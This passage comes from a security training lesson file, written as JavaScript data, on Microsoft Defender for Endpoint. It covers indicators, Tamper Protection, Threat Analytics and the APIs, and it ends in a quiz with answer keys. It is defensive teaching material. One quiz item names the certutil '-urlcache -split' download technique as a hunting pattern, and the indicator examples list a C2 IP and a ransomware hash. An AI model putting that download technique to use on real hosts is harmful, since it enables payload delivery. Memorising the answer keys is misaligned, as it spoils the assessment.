here\n\nAn indicator set to allow — most commonly used for a certificate or file hash generating persistent false positives — carries the identical risk the CrowdStrike lesson's IOC allowlisting section already taught: it permanently suppresses Defender's own judgment about that specific artifact going forward, so if that certificate is later compromised or that file is later trojanized, an allow indicator means Defender stays silent about it specifically because you told it to. Every allow indicator should be a documented, reviewed decision tied to a specific verified reason, not a reflex response to an annoying alert.",
        "codeExample": "// Indicators — four types, each with an action: Allow / Block / Warn / Audit\n\nFileHashIndicator {\n  sha256: \"3d5f2b8a...\",\n  action: \"Block\",\n  title: \"Known ransomware loader — CISA AA26-xxx advisory\"\n}\n\nIPIndicator {\n  ip: \"185.10.44.6\",\n  action: \"Block\",\n  title: \"C2 infrastructure — confirmed in this incident\"\n}\n\nCertificateIndicator {\n  thumbprint: \"A1B2C3...\",\n  action: \"Allow\",\n  title: \"Internal code-signing cert — verified false positive, ticket SEC-991\",\n  // NOTE: certificate indicators OUTRANK file-hash allow indicators\n  // and can take up to 3 hours to fully propagate\n}\n\n// Bulk import via CSV — same four columns for hundreds of indicators at once:\n// IndicatorValue, IndicatorType, Action, Title"
      },
      {
        "heading": "Beyond ASR: Controlled Folder Access, Network Protection, Exploit Protection, and Tamper Protection",
        "content": "ASR rules block specific, named attack behaviors. Four further, complementary protections round out MDE's attack-surface-reduction capability, each addressing a distinct layer an ASR rule alone does not cover, and each generating its own kind of event worth recognizing during an investigation.\n\n| Capability | What it protects against | How it works |\n| --- | --- | --- |\n| Controlled Folder Access (CFA) | Ransomware encrypting files in protected folders | Checks apps against a trusted-app list; blocks untrusted apps from modifying protected folder contents |\n| Network Protection | Connections to malicious or low-reputation domains/IPs | Extends Defender SmartScreen to block outbound HTTP(S) traffic to low-reputation destinations |\n| Exploit Protection | Memory-corruption and exploit techniques against OS processes and apps | Applies exploit mitigation techniques (e.g., DEP, ASLR-related controls) automatically, reports to MDE |\n| Tamper Protection | An attacker or malware disabling MDE's own defenses | Locks core security settings (real-time protection, cloud-delivered protection) from being changed, including by a local admin |\n\n### Controlled Folder Access, in practice\n\nControlled Folder Access protects a defined set of folders — Documents and other common user-data locations by default, with the ability to add more — by checking every app that tries to modify a file inside them against a list of trusted applications. An app not on that trusted list, attempting to encrypt or otherwise modify files inside a protected folder, gets blocked outright, which is precisely the ransomware-encryption moment the SentinelOne lesson's Rollback section addresses reactively — CFA is the same problem addressed proactively, before encryption succeeds rather than after.\n\n### Network Protection as the browser-and-beyond equivalent of ASR\n\nNetwork Protection operates below the browser layer, blocking outbound connections system-wide to destinations with a low reputation score, regardless of which process is initiating the connection — a capability that complements DeviceNetworkEvents hunting directly: an outbound connection you would otherwise have to catch by hunting or waiting for an alert may simply never succeed at all if Network Protection's reputation check blocks it first.\n\n### Why Tamper Protection matters specifically to an analyst reading an incident\n\nAn attacker with local administrative rights on a compromised host has an obvious next move: disable the security tooling watching them. Tamper Protection is designed specifically to prevent that — locking security settings like real-time protection and cloud-delivered protection so they cannot be turned off through the registry, PowerShell, Group Policy, or the Security app UI, even by an account with local admin rights, without going through Microsoft's own managed control plane.\n\nWhen you are investigating a host and see repeated, failed attempts in the logs to modify Defender's own configuration, that is not noise — it is a strong signal of an attacker actively trying and failing to blind the very sensor you are using to investigate them, and it deserves the same urgency as any other credential-access or defense-evasion technique, precisely because Tamper Protection turning those attempts into failures, rather than silent successes, is often the only reason you still have visibility into the rest of the attack at all."
      },
      {
        "heading": "Threat Analytics: Microsoft's In-Product Threat Intelligence Reports",
        "content": "Advanced Hunting answers the questions an analyst thinks to ask. **Threat Analytics**, reachable from the Defender portal's navigation bar or its own dashboard card, answers a different and complementary question: what is Microsoft's own security research team currently seeing across the threat landscape, and is any of it active in *this* specific tenant right now.\n\n### What a Threat Analytics report actually contains\n\nEach report, authored by Microsoft security researchers, tracks a specific threat actor, campaign, or technique category and typically includes an analysis of how the threat operates, concrete defensive guidance for stopping it, and — critically — data pulled directly from the tenant's own telemetry showing whether related activity, related alerts, or related exposed assets are present in the environment right now. This last part is what separates Threat Analytics from a generic vendor blog post: the report is not just describing a threat in the abstract, it is telling a specific SOC whether that threat has already touched their specific environment.\n\n### Why this belongs in a hunting and triage workflow, not just a reading list\n\nWhen a major new campaign or vulnerability is disclosed — the kind of event that used to mean a SOC scrambling to manually write hunting queries from scratch against a vendor advisory — Threat Analytics gives an analyst a starting point already connected to their own data: related incidents and alerts already surfaced, impacted assets already identified, and recommended mitigations already prioritized, without needing to hand-build every KQL query the moment a new threat is disclosed.\n\nThis does not replace the Advanced Hunting skill this lesson centers on — if a report's related-activity view does not fully answer your specific question, the report typically links directly to hunting queries an analyst can run and further customize against DeviceProcessEvents, DeviceNetworkEvents, and the other core tables already covered. Threat Analytics is best read as a curated starting point that accelerates a hunt, not a substitute for the underlying hunting skill itself.\n\n### Access requirements worth knowing\n\nAccessing Threat Analytics requires a license for at least one Defender product, with one notable exception: an MDE Plan 1 license alone does not grant access, which is worth knowing before assuming every MDE-licensed tenant automatically has this capability available. Within the portal, viewing a report also requires specific read permissions covering security data, vulnerability management, and exposure management, reflecting how tightly Threat Analytics is woven into the platform's broader exposure and vulnerability data rather than functioning as a standalone reading feed."
      },
      {
        "heading": "Programmatic Access: The Defender APIs and the Streaming API",
        "content": "Everything covered in this lesson — Advanced Hunting queries, alerts, incidents, device information, response actions — is also reachable outside the portal through the **Microsoft Defender for Endpoint APIs**, and understanding this layer changes how a mature SOC scales beyond one analyst clicking through one console.\n\n### Two access patterns for two different needs\n\n- **Request-based APIs** — a client authenticates through Microsoft Entra ID (Azure AD) and calls specific REST endpoints on demand: run an Advanced Hunting query, retrieve a list of alerts, isolate a device, pull device information. This is the pattern a SOC's own automation, a case-management integration, or a scheduled script would use to pull or act on data at the moment it is needed.\n- **The Streaming API** — rather than a client asking for data, Defender pushes a continuous, real-time stream of events and alerts as they occur to an Azure Event Hub, or to an Azure storage account for long-term retention. This is the pattern used when a SOC wants MDE telemetry flowing continuously into an external SIEM or long-term data lake, without any client having to poll for updates.\n\n### Where the Microsoft Graph Security API fits\n\nSeparately, the **Microsoft Graph Security API** provides a unified, cross-product interface — its /security/alerts_v2 endpoint, for example, surfaces alerts aggregated not just from MDE but from other onboarded Microsoft and third-party security providers through one common schema. Where the MDE-specific APIs are the deepest, most detailed way to interact with MDE's own data, the Graph Security API is the broader, cross-product layer more suited to an integration that needs one consistent format across multiple security tools rather than MDE's native, more granular schema.\n\n### Why this matters even if you never write integration code yourself\n\nAs a working analyst, the practical reason to know this layer exists is recognizing when a case, a tag, or an enrichment already present on an incident by the time you open it came from automation built on these APIs, not from a colleague's manual work — the identical judgment already introduced for Falcon Fusion SOAR workflows and SentinelOne's STAR rules. A mature SOC's tooling is rarely just the console; it is the console plus a layer of automation quietly acting on the same data through these APIs, and knowing that layer exists is what lets you correctly interpret what you are seeing when you open an incident that already looks partially worked before you ever touched it."
      }
    ],
    "keyTakeaways": [
      "MDE is one of four components under Defender XDR, and an alert should always be read with the expectation it may correlate with a phishing email, identity anomaly, or cloud app finding from the other three components in the same Incident.",
      "Five Advanced Hunting tables cover most endpoint hunting — DeviceProcessEvents, DeviceNetworkEvents, DeviceLogonEvents, DeviceFileEvents, DeviceRegistryEvents — and a KQL query is best built incrementally, one filtering decision per line, rather than written all at once.",
      "Automated Investigation and Response (AIR) handles high-confidence, well-understood remediations automatically and queues ambiguous or high-risk cases for analyst approval in the Action Center — check what AIR already resolved before duplicating its work, and confirm nothing pending is sitting unreviewed.",
      "Device Isolation stops network spread immediately while preserving the console's connection to the device; Live Response is the investigative shell used most safely after isolation — reversing that order gives an active attacker extra time before being cut off.",
      "ASR rules are deployed in Audit mode first specifically so a security team can review, via DeviceEvents, exactly what a rule would have blocked before switching to Block mode — skipping that review risks either a business-disrupting outage or a rule quietly reverted after the first complaint.",
      "A validated Advanced Hunting (KQL) query graduates into a custom detection rule that Defender runs on a schedule, alerting on each match and optionally taking response actions (isolate, collect package, run AV) — the query must project entity columns (device/account/file) to act on, and you validate fidelity + start alert-only before automating, the ASR audit-first discipline applied to your own detections.",
      "Microsoft Defender XDR correlates MDE (endpoint) with MDO (email), MDI (on-prem identity/AD), and MDCA (cloud apps) into ONE incident with a unified timeline — so a phish→endpoint→identity→cloud attack appears as one story, and you triage the correlated INCIDENT (true scope/severity) not the lone alert; and Microsoft Defender Vulnerability Management (MDVM) turns the same MDE agent into a live exposure feed (CVEs, misconfigs, exposure score) that often explains HOW a compromised host was breached and points at the fix that stops recurrence."
    ],
    "quiz": [
      {
        "question": "You want to hunt for a suspicious process that made an outbound connection to a rare external IP address shortly after it was created. Which two Advanced Hunting tables do you need to join to answer that specific question?",
        "options": [
          {
            "label": "DeviceProcessEvents joined with DeviceNetworkEvents, correlated on the same device and a matching process identifier",
            "value": "a"
          },
          {
            "label": "DeviceRegistryEvents joined with DeviceFileEvents, correlated on the registry key path and the file's SHA256 hash",
            "value": "b"
          },
          {
            "label": "EmailEvents joined with EmailAttachmentInfo, correlated on the message identifier and the attachment file name",
            "value": "c"
          },
          {
            "label": "IdentityLogonEvents joined with CloudAppEvents, correlated on the user's sign-in session and app consent grant",
            "value": "d"
          }
        ],
        "answer": "a",
        "explanation": "Process creation lives in DeviceProcessEvents and outbound network connections live in DeviceNetworkEvents, so answering a question that spans both process context and network behavior requires joining exactly those two tables on the device and process identifier. Options b, c, and d each pair tables relevant to different investigation types (persistence hunting, email-based delivery, and identity/cloud app activity) that do not answer this specific process-to-network question."
      },
      {
        "question": "Automated Investigation and Response (AIR) in Defender XDR analyzes an incident and, based on its confidence in the verdict, can automatically remediate certain entities without waiting for an analyst. What is the correct way to think about AIR's role in the workflow?",
        "options": [
          {
            "label": "It handles high-confidence, well-understood remediations automatically, while lower-confidence findings still wait for analyst approval",
            "value": "a"
          },
          {
            "label": "It replaces the entire SOC analyst role for every incident, since Defender XDR is designed to run without any human review",
            "value": "b"
          },
          {
            "label": "It only generates a written report describing the incident, without taking any remediation action on any entity",
            "value": "c"
          },
          {
            "label": "It requires a Global Administrator to manually approve each individual step before AIR is allowed to begin analysis",
            "value": "d"
          }
        ],
        "answer": "a",
        "explanation": "AIR's design deliberately splits work by confidence: unambiguous, high-confidence cases are remediated automatically, while ambiguous or high-risk cases are queued in the Action Center for a human decision. Option b overstates AIR as a full replacement for analyst judgment, which contradicts its own design. Option c understates AIR, which does take automatic remediation action in high-confidence cases. Option d misdescribes the workflow — AIR's investigation runs automatically; only the higher-risk remediation actions require approval."
      },
      {
        "question": "You need to both cut a compromised device off from the rest of the network immediately and separately run investigative commands like tasklist and netstat on that same device while it stays contained. Which pairing of MDE capabilities does this?",
        "options": [
          {
            "label": "Device Isolation for the network cutoff, and Live Response for the remote command execution once the device is contained",
            "value": "a"
          },
          {
            "label": "Advanced Hunting for the network cutoff, and Automated Investigation and Response for running the remote commands",
            "value": "b"
          },
          {
            "label": "Attack Surface Reduction rules for the network cutoff, and the Device Inventory page for running the remote commands",
            "value": "c"
          },
          {
            "label": "The Incident Graph for the network cutoff, and the Alert Queue for running the remote commands directly on the device",
            "value": "d"
          }
        ],
        "answer": "a",
        "explanation": "Device Isolation is the specific action that cuts network access while preserving the console's connection to the device, and Live Response is the specific tool for running interactive investigative commands on that device afterward. Advanced Hunting and AIR are hunting and automated-remediation tools, not isolation or shell mechanisms. ASR rules block specific behaviors rather than isolate a device. The Incident Graph and Alert Queue are visualization and triage views, not response actions."
      },
      {
        "question": "An analyst writes an Advanced Hunting (KQL) query in Microsoft Defender for Endpoint that reliably catches a specific malicious behaviour. They want it to alert automatically going forward and, for clear cases, isolate the affected device. What capability does this, and what discipline must accompany it?",
        "options": [
          {
            "label": "There is no way to automate an Advanced Hunting query, so the analyst can only re-run it by hand periodically; MDE queries are strictly for one-off manual investigations and can never generate alerts or actions",
            "value": "a"
          },
          {
            "label": "Save it as a custom detection rule: Defender runs the query on a schedule, generates an alert on each match, and can take response actions (like isolation) — but the query must project the right entity columns, and you validate fidelity and start alert-only before enabling automatic actions",
            "value": "b"
          },
          {
            "label": "The analyst should convert the KQL into an Attack Surface Reduction rule, because ASR rules are the mechanism for turning any custom hunting query into a scheduled, automatically-responding detection in Defender",
            "value": "c"
          },
          {
            "label": "The correct approach is to set the whole tenant's automation level to fully automatic so every Advanced Hunting query the analyst has ever run begins isolating devices immediately without any further configuration",
            "value": "d"
          }
        ],
        "answer": "b",
        "explanation": "A validated Advanced Hunting query becomes a custom detection rule that Defender runs on a schedule, alerting on each match and optionally taking response actions such as device isolation — provided the query projects the entity columns (device, account, file) the rule needs to act on. The discipline is the recurring one: validate fidelity, start alert-only, then consider automated actions, exactly the ASR audit-first principle. Option a wrongly claims no automation exists. Option c confuses ASR (behaviour-blocking rules) with custom detections. Option d is reckless, wiring untested queries to automatic isolation tenant-wide."
      },
      {
        "question": "In Microsoft Defender XDR, a low-severity endpoint alert (MDE) appears alongside, and correlated into the same incident as, a phishing detection (MDO), a suspicious AD authentication (MDI), and an anomalous cloud-app login (MDCA). Why is working the correlated incident superior to triaging the endpoint alert alone?",
        "options": [
          {
            "label": "It is not superior; the analyst should ignore the other products entirely and assess only the endpoint alert, because MDE is the only Defender component whose alerts carry any real security meaning",
            "value": "a"
          },
          {
            "label": "Defender XDR stitches the four products' fragments into one incident with a unified timeline, revealing a cross-domain attack (phish → endpoint → identity → cloud); the endpoint alert looks minor alone but is one step of a real intrusion, so triaging the incident shows true scope and severity",
            "value": "b"
          },
          {
            "label": "The correlation is meaningless coincidence, so the four alerts should each be investigated by four different teams with no communication between them, exactly as if the XDR portal did not correlate them at all",
            "value": "c"
          },
          {
            "label": "Working the incident is worse than the single alert, because combining alerts from email, identity, and cloud always inflates severity artificially and the endpoint alert's original low rating is the only trustworthy signal",
            "value": "d"
          }
        ],
        "answer": "b",
        "explanation": "Defender XDR correlates MDE, MDO, MDI, and MDCA into a single incident with a unified timeline, so a phishing email → endpoint payload → AD credential abuse → cloud exfiltration appears as one connected attack. The endpoint alert that looks minor in isolation is revealed as one step of a real cross-domain intrusion, which is exactly why you triage the correlated incident, not the lone alert — the true scope and severity are only visible together. Option a discards the other domains' evidence. Option c fragments a single attack across siloed teams. Option d wrongly treats correlation as inflating rather than revealing severity."
      },
      {
        "question": "You run the certutil.exe hunting query from the worked example and get two matching rows: one from a finance workstation at 3:12 AM against a raw IP address, dropping its output into a Users\\Public folder, and one from a known patch-management service account against an internal domain during business hours. What is the correct next step?",
        "options": [
          {
            "label": "Isolate both devices immediately, since any process matching this exact command-line pattern is automatically confirmed as compromise requiring no further review",
            "value": "a"
          },
          {
            "label": "Flag the first row for investigation given its odd hour, raw IP, and unusual drop path, while treating the second as likely legitimate given the known service account",
            "value": "b"
          },
          {
            "label": "Discard both matches without further review, since certutil -urlcache -split is a signed Microsoft binary and therefore can never be malicious",
            "value": "c"
          },
          {
            "label": "Convert the query directly into an Attack Surface Reduction rule set to Block mode, since ASR is the correct way to act on hunting results",
            "value": "d"
          }
        ],
        "answer": "b",
        "explanation": "The query surfaces candidates; reading each row's surrounding context is what separates a real threat from routine noise. The first row's off-hours timing, raw IP destination, and use of a world-writable drop folder are strong indicators worth escalating, while the second row's known service account, internal domain, and business-hours timing match ordinary patch-management activity. Option a ignores context and would isolate a legitimate patching workflow. Option c wrongly assumes a signed binary can never be abused — LOLBin abuse is exactly the technique of misusing signed, trusted tools. Option d confuses ASR (a behavior-blocking rule) with the custom detection workflow this query is meant to feed."
      },
      {
        "question": "A SOC analyst wants to make sure a confirmed-malicious file hash is blocked from executing anywhere in the environment the moment it is identified, without waiting to write and validate a custom KQL detection rule first. Which MDE capability directly does this, and how does it relate to custom detection rules?",
        "options": [
          {
            "label": "Indicators: adding the file hash under Settings > Endpoints > Indicators with a Block action stops it from executing tenant-wide immediately, addressing a known artifact directly rather than requiring a behavioral query",
            "value": "a"
          },
          {
            "label": "Attack Surface Reduction rules, since ASR is the only mechanism in MDE capable of blocking a specific known file hash from executing anywhere in the tenant",
            "value": "b"
          },
          {
            "label": "Threat Analytics, because publishing a report about the file hash automatically blocks it from executing on every onboarded device without further configuration",
            "value": "c"
          },
          {
            "label": "There is no way to block a specific known-bad file hash directly in MDE; a custom KQL detection rule with an automated isolation action is the only available mechanism",
            "value": "d"
          }
        ],
        "answer": "a",
        "explanation": "Indicators are MDE's artifact-based blocking mechanism — a file hash added with a Block action is blocked tenant-wide immediately, addressing a known-bad artifact directly rather than requiring a behavioral pattern match. This is the IOC-management counterpart to the behavior-based custom detection rules and ASR rules covered elsewhere in the lesson. Option b misassigns this capability to ASR, which blocks named behaviors, not arbitrary specific hashes. Option c misdescribes Threat Analytics, which is a reporting and context feature, not a blocking mechanism. Option d wrongly claims no direct blocking mechanism exists."
      }
    ],
    "references": [
      "https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/microsoft-defender-endpoint",
      "https://learn.microsoft.com/en-us/microsoft-365/security/defender/advanced-hunting-overview",
      "https://learn.microsoft.com/en-us/microsoft-365/security/defender/m365d-autoir",
      "https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/attack-surface-reduction",
      "https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/respond-machine-alerts"
    ],
    "xp": 375,
    "estimatedMinutes": 74,
    "published_at": "2026-08-12T00:00:00.000Z",
    "createdAt": "2026-08-12T00:00:00.000Z",
    "researchUsed": false
  }
];
export default lessons;
